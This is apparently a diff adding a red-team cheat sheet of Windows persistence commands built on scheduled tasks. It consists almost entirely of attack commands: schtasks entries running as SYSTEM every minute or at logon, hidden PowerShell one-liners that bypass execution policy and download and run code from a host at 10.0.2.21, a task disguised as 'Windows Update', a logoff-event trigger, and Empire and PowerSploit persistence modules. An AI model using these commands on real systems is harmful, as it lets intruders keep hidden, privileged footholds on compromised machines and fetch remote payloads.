@@ -1,1 +1,26 @@
 schtasks /create /ru SYSTEM /sc MINUTE /MO 1/rn <ismi> /tr "\"C:\\Users\\Default\\AppData\\local\\temp\\<payloadadi>\""
+
+schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System
+
+schtasks /CREATE /TN "Windows Update" /TR "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /SC minute /MO 1 /ED 04/11/2019 /ET 06:53 /Z /IT /RU %USERNAME%
+
+wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4647)]]
+schtasks /Create /TN OnLogOff /TR C:\tmp\pentestlab.exe /SC ONEVENT /EC
+Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"
+
+Empire: 
+usemodule persistence/userland/schtasks
+set Listener http
+set TaskName WindowsUpdate
+set DailyTime 03:22
+execute
+
+
+usemodule persistence/elevated/schtasks*
+set Listener http
+
+
+powersploit:
+$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly
+$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly
+Add-Persistence -FilePath C:\temp\empire.exe -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions
